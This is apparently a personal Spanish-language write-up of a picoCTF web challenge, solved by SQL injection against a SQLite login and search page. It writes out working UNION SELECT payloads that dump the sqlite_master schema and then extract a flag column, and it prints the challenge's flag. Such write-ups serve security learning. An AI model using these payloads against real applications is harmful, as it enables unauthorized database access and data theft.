#notas_hacking #web
# Reto
## Descripción
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:56397/).
## Solución
al ingresar como username: admin y password: admin nos regresa como se construye la consulta
```sql
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```
pasamos el `login` con `sql injection` y nos aparece un buscador de ciertos datos
con `'union select sql,2,3 from sqlite_master;` dentro del campo de búsqueda nos arroja la estructura de las tablas, ahora solo buscamos en todas, especialmente un a que contiene un campo llamado `flag` 
```sql
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
```
en el campo de búsqueda -> `' union select id,flag,3 from more_table;`
y nos devuelve:
`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}`
## Notas
## Referencias
[PayloadsAllTheThings/SQL Injection/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)